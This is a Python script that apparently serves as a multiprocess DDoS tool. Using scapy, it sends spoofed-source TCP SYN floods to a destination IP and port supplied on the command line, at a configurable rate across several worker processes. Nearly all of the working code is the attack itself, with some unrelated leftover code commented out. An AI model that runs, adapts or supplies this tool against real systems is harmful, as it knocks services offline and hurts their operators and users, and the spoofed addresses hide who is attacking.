#!/usr/bin/python

import argparse
import os
import sys
import time
from multiprocessing import freeze_support, current_process, Process
import random

# # Define custom modules directory for project
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'custom_modules')))
# # Import custom modules
import scapy.all as scapy


def print_w_pid(line):
    print('[{}] {}'.format(current_process().ident, line))


class Shaper(object):
    def __init__(self, ip_generator, dst, dport, verbose):
        self.buffer = []
        self.pkt_counter = 0
        self.sent_counter = 0
        self.ip_generator = ip_generator
        self.dst = dst
        self.dport = int(dport)
        self.pkt = None
        self.time_last_insertion = time.time()
        self.verbose = verbose
        self.avg_rps_counter = 0

    def fill_buffer(self, rps, counter, profile):
        while True:
            print_w_pid('Filling buffer ...')
            print_w_pid('Selected profile: %s' % profile)
            while rps != len(self.buffer):
                # Define IP headers
                ip_h = scapy.IP()
                ip_h.dst = self.dst
                if profile == 'SYN_flood':
                    ip_h.src = next(self.ip_generator)
                    # Define TCP headers
                    tcp_h = scapy.TCP()
                    tcp_h.sport = scapy.RandShort()
                    tcp_h.dport = self.dport
                    tcp_h.flags = 'S'
                    # Assemble the network package
                    pkt = ip_h / tcp_h
                    self.buffer.append(pkt)
            counter, self.time_last_insertion, self.avg_rps_counter = \
                self._send_batch(self.buffer, counter, self.time_last_insertion, self.avg_rps_counter)
            self.buffer[:] = []

    def _send_batch(self, buffer, sent_counter, time_last_insertion, avg_rps_counter):
        payload_buffer = buffer
        pause = 1.0
        pkt_counter = len(payload_buffer)

        # Sending ...
        [scapy.send(pkt, verbose=self.verbose) for pkt in payload_buffer]

        # Buffer clearing
        if pkt_counter:
            payload_buffer[:] = []

        time_after_insertion = time.time()
        pause -= time_after_insertion - time_last_insertion

        if pause < 0.0:
            pause = 0.0

        avg_rps = pkt_counter / (time_after_insertion + pause - time_last_insertion)

        avg_rps_counter += avg_rps

        # line_template = 'Sent {} packages; took {:.3f}; actual avg eps: {:.0f}'
        # print_w_pid(line_template.format(pkt_counter, time_after_insertion - time_last_insertion, avg_rps))
        line_template = 'took {:.3f}; actual avg rps: {:.0f} '
        print_w_pid(line_template.format(time_after_insertion - time_last_insertion, avg_rps))

        # Statistics.
        # if sent_counter % 1000 == 0 and sent_counter > 0:
        #     line_template = 'Sent {} packages; took {:.3f}; actual avg eps: {:.0f}'
        #     print_w_pid(line_template.format(pkt_counter, time_after_insertion - time_last_insertion, avg_rps))

        # sys.stdout.flush()
        sent_counter += pkt_counter
        time_last_insertion = time.time()

        return sent_counter, time_last_insertion, avg_rps_counter


class Worker(Process):
    def __init__(self, *args, **kwargs):
        super(Worker, self).__init__()
        self.kwargs = kwargs

    @staticmethod
    def get_args():
        """
        Implement this to get args from command line
        """

        parser = argparse.ArgumentParser(description=Worker.get_args.__doc__)
        parser.version = '1.0'

        parser.add_argument('profile', action='store', nargs='?', default='SYN_flood',
                            choices=['SYN_flood', 'ASK_flood'],
                            help='name of the DDoS profile')

        parser.add_argument('-l', '--list', action='store_true',
                            help='list of all allowed profiles')

        parser.add_argument('-v', '--verbose', action='store', type=int, default=0,
                            help='verbosity level')

        parser.add_argument('-dst', action='store', required=True,
                            help='destination IP Address')

        parser.add_argument('-dport', action='store', required=True,
                            help='destination port')

        parser.add_argument('-rps', action='store', type=int, default=3000,
                            help='requests per second')

        parser.add_argument('-n', action='store', type=int, default=1,
                            help='number of worker processes (default: 1)')

        return parser.parse_args()

    def run(self):
        self._start()

    def _start(self):
        shaper_buffer = Shaper(self.ip_gen(), self.kwargs['dst'], self.kwargs['dport'], self.kwargs['verbose'])
        shaper_buffer.fill_buffer(self.kwargs['rps'], 0, self.kwargs['profile'])
        # [print_w_pid(_.summary()) for _ in got_buffer]

    # def _start(self):
    #     # Define Ether headers
    #     # ether_h = scapy.Ether()
    #
    #     # Define IP headers
    #     ip_h = scapy.IP()
    #     ip_h.src = self.get_ip()
    #     ip_h.dst = '10.206.255.122'
    #
    #     # Define TCP headers
    #     tcp_h = scapy.TCP()
    #     tcp_h.sport = scapy.RandShort()
    #     tcp_h.dport = [3389, 1468]
    #     tcp_h.flags = 'S'
    #
    #     # Define ICMP headers
    #     # icmp_h = scapy.ICMP()
    #     # icmp_h.id = '0x6003'
    #
    #     # Assemble the packet
    #     pkt = ip_h/tcp_h
    #     # pkt = ip_h/icmp_h/"XXXXXXXXXXX"
    #
    #     print_w_pid(pkt.summary())
    #
    #     # Sending packages ...
    #     scapy.send(pkt, verbos=0)
    #     # ans, unans = scapy.sr(pkt)
    #     # ans.summary()

    @staticmethod
    def ip_gen():
        while True:
            yield ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # return ip

        # sender_inst = None
        # if self.kwargs['gather_stats']:
        #     sender_inst = None
        # else:
        #     if self.amqp_url:
        #         sender_inst = RMQProtobufSender(amqp_url=self.amqp_url, exchange=self.exchange,
        #                                         non_durable=self.non_durable, batch_size=self.batch_size,
        #                                         agent_id=self.agent_id, job_id=self.job_id,
        #                                         preserve=self.preserve, compress=self.compress,
        #                                         debug_output=self.debug_output, sema=self.sema,
        #                                         influx_client=self.influx_client, print_unpatched=self.print_unpatched,
        #                                         **self.kwargs)
        #     elif self.rester_url:
        #         sender_inst = ProtobufSender(rester_url=self.rester_url, batch_size=self.batch_size,
        #                                      use_ssl=self.use_ssl,
        #                                      agent_id=self.agent_id, job_id=self.job_id,
        #                                      preserve=self.preserve, compress=self.compress,
        #                                      debug_output=self.debug_output, sema=self.sema,
        #                                      influx_client=self.influx_client,
        #                                      print_unpatched=self.print_unpatched,
        #                                      **self.kwargs)
        #     elif self.syslog_tcp:
        #         sender_inst = TCPSender(syslog_tcp=self.syslog_tcp, debug_output=self.debug_output, sema=self.sema,
        #                                 influx_client=self.influx_client,
        #                                 print_unpatched=self.print_unpatched,
        #                                 **self.kwargs)
        #     elif self.udp:
        #         sender_inst = UDPSender(udp=self.udp, debug_output=self.debug_output, sema=self.sema,
        #                                 influx_client=self.influx_client, print_unpatched=self.print_unpatched,
        #                                 **self.kwargs)
        #     else:
        #         print_w_pid('No supported senders selected.')
        #         sys.exit(0)
        # # Flow Generator init
        # if self.kwargs['random_date'] or self.kwargs['random_time']:
        #     flow_generator = RawEventsPatcherRandomDateAndTime(self.files, self.preserve, self.debug_output,
        #                                                        self.scope_id, self.offset, self.print_unpatched,
        #                                                        nworkers=self.nworkers,
        #                                                        **self.kwargs)
        # else:
        #     flow_generator = RawEventsPatcher(self.files, self.preserve, self.debug_output, self.scope_id, self.offset,
        #                                       self.print_unpatched, nworkers=self.nworkers,
        #                                       custom_date=self.custom_date, **self.kwargs)
        #
        # # Shaper Coroutine init.
        # shaper_inst = Shaper(flow_generator.lines(), sender_inst, self.influx_client)
        #
        # sent_counter = 0
        # sent_counter = shaper_inst.fill_buffer(self.total, self.eps, self.freq, sent_counter, self.load_profiles)
        # # print_w_pid('exited from fill_buffer')
        # if self.kwargs['gather_stats']:
        #     with open('bomber.{}.stats'.format(uuid.uuid4()), 'w+') as f:
        #         if flow_generator.patcher.stats:
        #             f.write(json.dumps(flow_generator.patcher.stats))
        #             # print_w_pid(flow_generator.patcher.stats)
        # if not self.debug_output:
        #     time.sleep(3)  # just for pretty output
        #     print_w_pid("Done (total = %s)." % sent_counter)


class Multiprocess(object):
    def __init__(self, worker, *args, **kwargs):
        """
        Gets Worker class and runs it in multiple processes
        :param worker: Worker class
        :param args:
        :param kwargs: a dict with all arguments to be passed to Worker. 'n' param is required
        """
        self.worker = worker
        self.args = args
        self.kwargs = kwargs

    def on_start(self):
        """
        Implement this to run anything before generators will be started
        """
        pass

    def on_stop(self):
        """
        Implement this to run anything after generators are finished or killed
        """
        pass

    def run(self):
        try:
            self.on_start()

            jobs = []

            if self.kwargs['n'] < 1:
                self.kwargs['n'] = 1
            for _ in range(0, self.kwargs['n'], 1):
                ddos = self.worker(*self.args, **self.kwargs)
                ddos.start()
                jobs.append(ddos)
                time.sleep(0.1)
            for ddos in jobs:
                ddos.join()

        finally:
            self.on_stop()


if __name__ == "__main__":
    freeze_support()
    try:
        doser = Multiprocess(Worker, **vars(Worker.get_args()))
        print_w_pid("Starting. Hit CTRL+C to kill process.")
        doser.run()
    except (SystemExit, KeyboardInterrupt):
        sys.exit(0)
